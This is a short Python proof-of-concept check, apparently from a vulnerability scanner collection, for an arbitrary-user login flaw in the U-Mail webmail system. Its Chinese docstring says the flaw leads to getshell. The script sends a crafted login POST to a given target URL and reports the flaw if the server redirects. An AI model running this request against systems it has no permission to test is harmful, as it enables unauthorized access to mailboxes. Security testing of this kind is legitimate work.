#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: U-Mail邮件系统sessionid访问
referer: http://www.wooyun.org/bugs/wooyun-2010-093049
author: Lucifer
description: 该邮件系统存在任意用户登录、且存在注入，从而可以无限制完美getshell(getshell过程只需简单三个请求)。
'''
import sys
import json
import requests
import warnings
from termcolor import cprint

class umail_sessionid_access_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50",
            }
        payload = "/webmail/fast/index.php?module=operate&action=login"
        post_data = {
                "mailbox":"test@domain.com",
                "link":"?"
            }
        vulnurl = self.url + payload
        try:
            req = requests.post(vulnurl, headers=headers, data=post_data, timeout=10, verify=False)
            if r'<meta http-equiv="refresh" content="0; URL=index.php">' in req.text:
                cprint("[+]存在umail sessionid登录漏洞...(中危)\tpayload: "+vulnurl+"\npost: "+json.dumps(post_data, indent=4), "yellow")
                return True, vulnurl, "U-Mail邮件系统sessionid访问", str(payload), req.text
            else:
                cprint("[-]不存在umail_sessionid_access漏洞", "white", "on_grey")
                return False, None, None, None, None

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")
            return False, None, None, None, None


if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = umail_sessionid_access_BaseVerify(sys.argv[1])
    testVuln.run()